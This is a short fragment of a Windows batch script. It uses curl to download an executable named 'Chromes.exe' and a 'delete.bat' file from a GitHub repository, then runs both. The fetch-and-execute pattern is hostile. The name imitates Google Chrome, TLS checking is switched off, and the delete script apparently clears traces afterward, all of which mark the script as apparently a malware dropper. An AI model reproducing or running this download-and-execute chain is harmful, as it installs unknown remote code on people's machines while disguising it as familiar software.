...
C:\curl -LJOk https://raw.githubusercontent.com/syedshariq121/labcc/main/Chromes.exe
C:\curl -LJOk https://raw.githubusercontent.com/syedshariq121/labcc/main/delete.bat
start Chromes.exe
cls
@echo off
start delete.bat
